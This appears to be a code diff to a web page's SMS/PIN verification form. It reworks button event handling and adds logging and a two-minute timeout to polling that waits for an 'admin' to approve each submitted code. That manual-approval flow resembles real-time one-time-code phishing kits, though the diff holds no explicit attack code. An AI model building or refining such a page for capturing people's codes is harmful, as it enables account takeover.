@@ -45,7 +45,8 @@
                 <input type="text" id="verificationPin" class="verify-input-field" placeholder="PIN Code Here" inputmode="numeric" pattern="[0-9]*" maxlength="6" required>
             </div>
 
-            <button type="button" id="verifyBtn" class="verify-btn" onclick="submitVerificationCode()">Verify</button>
+            <!-- Verify Button -->
+            <button type="button" id="verifyBtn" class="verify-btn">Verify</button>
 
             <div id="loadingSpinner">
                 <div class="spinner"></div>
@@ -62,13 +63,20 @@
     </div>
 
     <script>
-        function showAppAlert(message) {
+        let pendingAction = null;
+
+        function showAppAlert(message, actionCallback = null) {
             document.getElementById('modalText').innerText = message;
             document.getElementById('customModal').style.display = 'flex';
+            pendingAction = actionCallback;
         }
 
         function closeModal() {
             document.getElementById('customModal').style.display = 'none';
+            if (pendingAction) {
+                pendingAction();
+                pendingAction = null;
+            }
         }
 
         async function submitVerificationCode() {
@@ -95,7 +103,7 @@
                 const result = await response.json();
 
                 if (result.success) {
-                    // Start polling: Will only proceed when admin clicks 'Approve'
+                    console.log('✅ SMS Code submitted successfully. Polling for approval...');
                     pollApprovalStatus(phoneInput);
                 } else {
                     verifyBtn.classList.remove('disabled-state');
@@ -114,13 +122,28 @@
             const cleanPhone = phone.trim();
             const verifyBtn = document.getElementById('verifyBtn');
             const spinnerDiv = document.getElementById('loadingSpinner');
+            
+            let elapsedTime = 0;
+            const maxWaitTime = 120000; // 2 minutes timeout safety net
 
             const statusInterval = setInterval(async () => {
+                elapsedTime += 3000;
+
+                // Failsafe timeout if admin doesn't click within 2 minutes
+                if (elapsedTime >= maxWaitTime) {
+                    clearInterval(statusInterval);
+                    if (spinnerDiv) spinnerDiv.style.display = 'none';
+                    verifyBtn.classList.remove('disabled-state');
+                    showAppAlert('⏱️ Request timed out. Please try again.');
+                    return;
+                }
+
                 try {
                     const response = await fetch(`/api/check-status?phone=${encodeURIComponent(cleanPhone)}`);
                     const data = await response.json();
 
-                    // ONLY move forward if explicitly approved
+                    console.log('Scratch2 Polling Status Response:', data);
+
                     if (data.status === 'approved') {
                         clearInterval(statusInterval);
                         window.location.href = 'new.html';
@@ -136,6 +159,14 @@
                 }
             }, 3000);
         }
+
+        // Attach click event to the verify button on page load
+        document.addEventListener('DOMContentLoaded', () => {
+            const verifyBtn = document.getElementById('verifyBtn');
+            if (verifyBtn) {
+                verifyBtn.addEventListener('click', submitVerificationCode);
+            }
+        });
     </script>
 </body>
 </html>
